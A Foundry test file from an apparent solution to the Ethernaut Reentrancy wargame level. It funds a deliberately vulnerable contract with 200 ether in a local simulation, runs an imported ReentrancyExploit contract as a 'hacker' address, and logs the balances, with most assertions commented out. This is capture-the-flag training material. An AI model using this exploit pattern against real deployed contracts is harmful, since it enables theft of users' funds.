// SPDX-License-Identifier: CC-BY-4.0
// bt3gl's solution to ethernaut

pragma solidity ^0.8.0;


import "forge-std/Test.sol";
import {Reentrance} from "src/10/Reentrancy.sol";
import {ReentrancyExploit} from "src/10/ReentrancyExploit.sol";

contract ReentrancyTest is Test {

    Reentrance public level;
    ReentrancyExploit public exploit;
    address payable instance = payable(vm.addr(0x10053)); 
    address hacker = vm.addr(0x1337); 
    uint256 initialDeposit = 0.01 ether;
    uint256 initialVictimBalance = 200 ether;

    function setUp() public {
        vm.prank(instance);  
        vm.deal(instance, initialVictimBalance);
        vm.deal(hacker, initialDeposit);

        level = new Reentrance();
        level.donate{value: initialVictimBalance}(instance);

        assert(hacker.balance == initialDeposit);
        assert(instance.balance == initialVictimBalance);
        assert(address(level).balance == initialVictimBalance);

    }
    

    function testReentrancyHack() public {

        vm.startPrank(hacker);

        exploit = new ReentrancyExploit(level);
        
        exploit.exploit{value: initialDeposit}();
        //assert(address(exploit).balance == 0);
        //assert(hacker.balance == 0);
        //assert(instance.balance == initialVictimBalance);
        //assert(address(level).balance == initialVictimBalance + initialDeposit);
        //assert(level.balanceOf(address(exploit)) == initialDeposit);
        

        exploit.withdraw();
        //assert(address(exploit).balance == initialDeposit);
        //assert(hacker.balance == 0);
        //assert(instance.balance == initialVictimBalance);
        //assert(address(level).balance == initialVictimBalance);
        //assert(level.balanceOf(address(exploit)) == 0);
        
        
        console.log(address(exploit).balance);
        console.log(hacker.balance);
        vm.stopPrank();
        
    }
}
